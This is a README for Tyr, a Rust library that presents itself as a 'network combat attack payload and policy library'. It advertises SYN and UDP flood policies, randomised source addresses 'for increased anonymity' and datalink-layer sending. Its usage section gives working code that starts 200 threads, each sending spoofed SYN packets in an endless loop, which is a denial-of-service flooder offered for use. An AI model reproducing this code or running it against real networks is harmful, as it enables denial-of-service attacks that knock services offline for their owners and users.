# Tyr

Tyr is a high-performance, cross-platform and all-protocol network combat attack payload and policy library.

## Features

- **Payload Generation**: Easily generate packets with customizable source and destination IP addresses, ports, and network interfaces.
- **Randomization**: Support for generating random IP addresses and ports for increased anonymity.
- **Multi-Threading**: Utilize multiple threads to send packets simultaneously, increasing the attack speed.
- **Datalink Layer**: Support for sending packets over the datalink layer, allowing for more advanced network attacks.
- **Network Combat Policy**: Support for launch network combat policies, including SYN flood, UDP flood, and more.
- **Error Handling**: Robust error handling to ensure smooth operation and informative error messages.

## Getting Started

### Prerequisites

- Rust programming language
- _WinPcap for Windows users_

### Installation

To use Tyr in your Rust project, add `tyr` to your `Cargo.toml` file.

Then, run `cargo build` to build your project.

## Usage

Here's a simple example of how to use Tyr to send SYN packets:

```rust
use pnet::datalink;
use tyr::error::Error;
use tyr::payload::Payload;

fn main() -> Result<(), Error> {
    tyr::rerun_if_not_root()?;

    let interface = tyr::interface::get_interface("wlo1").ok_or(Error::InterfaceNotFound)?;

    let mut payload = tyr::payload::syn::SYNPayload::random(&interface);
    let mut packet = [0u8; 52];
    payload.build(&mut packet)?;

    let mut handles = vec![];
    for _ in 0..200 {
        let interface = interface.clone();
        if let datalink::Channel::Ethernet(mut tx, _) =
            datalink::channel(&interface, Default::default())?
        {
            let handle: std::thread::JoinHandle<Result<(), Error>> =
                std::thread::spawn(move || loop {
                    tx.send_to(&packet, Some(interface.clone())).unwrap()?;
                });
            handles.push(handle);
        };
    }

    for handle in handles {
        handle.join().unwrap()?;
    }

    Ok(())
}
```

## Contributing

Contributions are very welcome! Please read our [Contributing Guidelines](CONTRIBUTING.md) for more information.

## License

This project is licensed under the AGPL-3.0 License by [@Noctisynth](https://github.com/noctisynth), org.
